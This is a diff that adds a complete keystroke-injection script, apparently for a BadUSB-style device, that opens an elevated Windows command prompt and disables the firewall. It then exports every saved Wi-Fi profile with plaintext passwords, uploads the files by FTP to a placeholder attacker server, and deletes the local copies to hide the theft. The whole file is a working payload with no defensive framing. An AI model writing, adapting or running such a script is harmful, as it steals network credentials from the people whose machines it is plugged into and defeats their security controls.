@@ -1,0 +1,40 @@
+Delay 1000
+PressKey KEY_GUI_LEFT
+Delay 2000
+Print cmd
+Delay 2000
+PressModKey MOD_SHIFT_LEFT KEY_F10
+Delay 3000
+PressKey KEY_ARROW_DOWN
+Delay 4000
+PressKey KEY_ENTER
+Delay 3000
+PressKey KEY_ARROW_LEFT
+Delay 4000
+PressKey KEY_ENTER
+Delay 3000
+PrintLine netsh advfirewall set currentprofile state off
+Delay 3000
+PrintLine cd %USERPROFILE%
+Delay 3000
+PrintLine netsh wlan export profile key=clear
+Delay 3000
+PrintLine ftp -i SERVERFTP
+Delay 10000
+PrintLine USERNAME
+Delay 3000
+PrintLine PASSWORD
+Delay 3000
+PrintLine prompt
+Delay 3000
+PrintLine prompt
+Delay 3000
+PrintLine MPUT *.xml
+Delay 3000
+PrintLine bye
+Delay 3000
+PrintLine del *.xml
+Delay 3000
+PrintLine netsh advfirewall set currentprofile state on
+Delay 3000
+PrintLine exit
